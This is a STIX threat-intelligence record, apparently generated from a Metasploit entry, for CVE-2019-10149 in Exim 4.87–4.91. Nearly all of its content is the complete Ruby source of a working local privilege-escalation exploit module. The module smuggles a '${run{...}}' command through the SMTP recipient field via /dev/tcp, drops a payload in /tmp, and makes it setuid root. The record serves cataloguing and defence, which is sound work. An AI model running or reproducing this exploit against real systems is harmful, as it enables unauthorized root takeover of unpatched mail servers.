{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f4c84b4c-4581-4c57-b8ec-ce4c1078c570",
    "created": "2024-08-14T16:58:49.769495Z",
    "modified": "2024-08-14T16:58:49.7695Z",
    "name": "Exim 4.87 - 4.91 Local Privilege Escalation",
    "description": " This module exploits a flaw in Exim versions 4.87 to 4.91 (inclusive). Improper validation of recipient address in deliver_message() function in /src/deliver.c may lead to command execution with root privileges",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/local/exim4_deliver_message_priv_esc.rb",
            "external_id": "exim4_deliver_message_priv_esc.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-10149"
        },
        {
            "source_name": "reference",
            "url": "https://www.openwall.com/lists/oss-security/2019/06/06/1"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::FileDropper\n  include Msf::Post::File\n  include Msf::Post::Linux::Priv\n  include Msf::Post::Linux::System\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Exim 4.87 - 4.91 Local Privilege Escalation',\n        'Description' => %q{\n          This module exploits a flaw in Exim versions 4.87 to 4.91 (inclusive).\n          Improper validation of recipient address in deliver_message()\n          function in /src/deliver.c may lead to command execution with root privileges\n          (CVE-2019-10149).\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Qualys', # Discovery and PoC (@qualys)\n          'Dennis Herrmann', # Working exploit (@dhn)\n          'Marco Ivaldi', # Working exploit (@0xdea)\n          'Guillaume Andr\u00e9' # Metasploit module (@yaumn_)\n        ],\n        'DisclosureDate' => '2019-06-05',\n        'Platform' => [ 'linux' ],\n        'Arch' => [ ARCH_X86, ARCH_X64 ],\n        'SessionTypes' => [ 'shell', 'meterpreter' ],\n        'Targets' => [\n          [\n            'Exim 4.87 - 4.91',\n            lower_version: Rex::Version.new('4.87'),\n            upper_version: Rex::Version.new('4.91')\n          ]\n        ],\n        'DefaultOptions' => {\n          'PrependSetgid' => true,\n          'PrependSetuid' => true\n        },\n        'References' => [\n          [ 'CVE', '2019-10149' ],\n          [ 'EDB', '46996' ],\n          [ 'URL', 'https://www.openwall.com/lists/oss-security/2019/06/06/1' ]\n        ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_fs_delete_file\n            ]\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptInt.new('EXIMPORT', [ true, 'The port exim is listening to', 25 ])\n      ]\n    )\n\n    register_advanced_options(\n      [\n        OptFloat.new('ExpectTimeout', [ true, 'Timeout for Expect when communicating with exim', 3.5 ]),\n        OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ])\n      ]\n    )\n  end\n\n  def base_dir\n    datastore['WritableDir'].to_s\n  end\n\n  def encode_command(cmd)\n    '\\x' + cmd.unpack('H2' * cmd.length).join('\\x')\n  end\n\n  def open_tcp_connection\n    socket_subsystem = Rex::Post::Meterpreter::Extensions::Stdapi::Net::Socket.new(client)\n    params = Rex::Socket::Parameters.new({\n      'PeerHost' => '127.0.0.1',\n      'PeerPort' => datastore['EXIMPORT']\n    })\n    begin\n      socket = socket_subsystem.create_tcp_client_channel(params)\n    rescue StandardError => e\n      vprint_error(\"Couldn't connect to port #{datastore['EXIMPORT']}, \"\\\n                  'are you sure exim is listening on this port? (see EXIMPORT)')\n      raise e\n    end\n    return socket_subsystem, socket\n  end\n\n  def inject_payload(payload)\n    if session.type == 'meterpreter'\n      socket_subsystem, socket = open_tcp_connection\n\n      tcp_conversation = {\n        nil => /220/,\n        'helo localhost' => /250/,\n        'MAIL FROM:<>' => /250/,\n        \"RCPT TO:<${run{#{payload}}}@localhost>\" => /250/,\n        'DATA' => /354/,\n        'Received:' => nil,\n        '.' => /250/\n      }\n\n      begin\n        tcp_conversation.each do |line, pattern|\n          if line\n            if line == 'Received:'\n              for i in (1..31)\n                socket.puts(\"#{line} #{i}\\n\")\n              end\n            else\n              socket.puts(\"#{line}\\n\")\n            end\n          end\n\n          next unless pattern\n\n          unless socket.expect(pattern, datastore['ExpectTimeout'])\n            fail_with(Failure::TimeoutExpired, \"Pattern not found: #{pattern.inspect}\")\n          end\n        end\n      rescue Rex::ConnectionError => e\n        fail_with(Failure::Unreachable, e.message)\n      ensure\n        socket.puts(\"QUIT\\n\")\n        socket.close\n        socket_subsystem.shutdown\n      end\n    else\n      unless cmd_exec(\"/bin/bash -c 'exec 3<>/dev/tcp/localhost/#{datastore['EXIMPORT']}' \"\\\n                      '&& echo true').chomp.to_s == 'true'\n        fail_with(Failure::NotFound, \"Port #{datastore['EXIMPORT']} is closed\")\n      end\n\n      bash_script = %|\n        #!/bin/bash\n\n        exec 3<>/dev/tcp/localhost/#{datastore['EXIMPORT']}\n        read -u 3 && echo $REPLY\n        echo \"helo localhost\" >&3\n        read -u 3 && echo $REPLY\n        echo \"mail from:<>\" >&3\n        read -u 3 && echo $REPLY\n        echo 'rcpt to:<${run{#{payload}}}@localhost>' >&3\n        read -u 3 && echo $REPLY\n        echo \"data\" >&3\n        read -u 3 && echo $REPLY\n        for i in $(seq 1 30); do\n          echo 'Received: $i' >&3\n        done\n        echo \".\" >&3\n        read -u 3 && echo $REPLY\n        echo \"quit\" >&3\n        read -u 3 && echo $REPLY\n      |\n\n      @bash_script_path = File.join(base_dir, Rex::Text.rand_text_alpha(10))\n      write_file(@bash_script_path, bash_script)\n      register_file_for_cleanup(@bash_script_path)\n      chmod(@bash_script_path)\n      cmd_exec(\"/bin/bash -c \\\"#{@bash_script_path}\\\"\")\n    end\n\n    print_status('Payload sent, wait a few seconds...')\n    Rex.sleep(5)\n  end\n\n  def on_new_session(session)\n    super\n\n    if session.type == 'meterpreter'\n      session.core.use('stdapi') unless session.ext.aliases.include?('stdapi')\n      session.fs.file.rm(@payload_path)\n    else\n      session.shell_command_token(\"rm -f #{@payload_path}\")\n    end\n  end\n\n  def check\n    if session.type == 'meterpreter'\n      begin\n        socket_subsystem, socket = open_tcp_connection\n      rescue StandardError\n        return CheckCode::Safe\n      end\n      res = socket.gets\n      socket.close\n      socket_subsystem.shutdown\n    else\n      unless command_exists?('/bin/bash')\n        return CheckCode::Safe('bash not found')\n      end\n\n      res = cmd_exec(\"/bin/bash -c 'exec 3</dev/tcp/localhost/#{datastore['EXIMPORT']} && \"\\\n                     \"(read -u 3 && echo $REPLY) || echo false'\")\n      if res == 'false'\n        vprint_error(\"Couldn't connect to port #{datastore['EXIMPORT']}, \"\\\n                     'are you sure exim is listening on this port? (see EXIMPORT)')\n        return CheckCode::Safe\n      end\n    end\n\n    if res =~ /Exim ([0-9\\.]+)/i\n      version = Rex::Version.new(Regexp.last_match(1))\n      vprint_status(\"Found exim version: #{version}\")\n      if version >= target[:lower_version] && version <= target[:upper_version]\n        return CheckCode::Appears\n      else\n        return CheckCode::Safe\n      end\n    end\n\n    CheckCode::Unknown\n  end\n\n  def exploit\n    if !datastore['ForceExploit'] && is_root?\n      fail_with(Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override.')\n    end\n\n    unless writable?(base_dir)\n      fail_with(Failure::BadConfig, \"#{base_dir} is not writable\")\n    end\n\n    if nosuid?(base_dir)\n      fail_with(Failure::BadConfig, \"#{base_dir} is mounted nosuid\")\n    end\n\n    unless datastore['PrependSetuid'] && datastore['PrependSetgid']\n      fail_with(Failure::BadConfig, 'PrependSetuid and PrependSetgid must both be set to true in order ' \\\n                                    'to get root privileges.')\n    end\n\n    unless session.type == 'meterpreter'\n      unless command_exists?('/bin/bash')\n        fail_with(Failure::NotFound, 'bash not found')\n      end\n    end\n\n    @payload_path = File.join(base_dir, Rex::Text.rand_text_alpha(10))\n    write_file(@payload_path, payload.encoded_exe)\n    register_file_for_cleanup(@payload_path)\n    inject_payload(encode_command(\"/bin/sh -c 'chown root #{@payload_path};\"\\\n                                  \"chmod 4755 #{@payload_path}'\"))\n\n    unless setuid?(@payload_path)\n      fail_with(Failure::Unknown, \"Couldn't escalate privileges\")\n    end\n\n    cmd_exec(\"#{@payload_path} & echo \")\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2019-06-05",
    "x_mitre_platforms": [
        "[ 'linux' ]"
    ]
}